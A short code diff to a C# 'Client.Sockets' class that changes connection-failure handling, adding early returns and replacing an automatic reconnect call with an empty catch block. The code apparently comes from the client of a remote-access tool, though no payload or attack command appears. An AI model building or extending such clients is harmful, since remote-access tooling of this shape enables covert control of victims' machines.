@@ -72,11 +72,17 @@ namespace Client.Sockets
                     Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
                     SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
                 }
+                else
+                {
+                    IsConnected = false;
+                    return;
+                }
             }
             catch
             {
                 Debug.WriteLine("Disconnected!");
                 IsConnected = false;
+                return;
             }
         }
 
@@ -98,10 +104,7 @@ namespace Client.Sockets
                 Client?.Dispose();
                 MS?.Dispose();
             }
-            finally
-            {
-                InitializeClient();
-            }
+            catch { }
         }
 
         public static void ReadServertData(IAsyncResult ar)
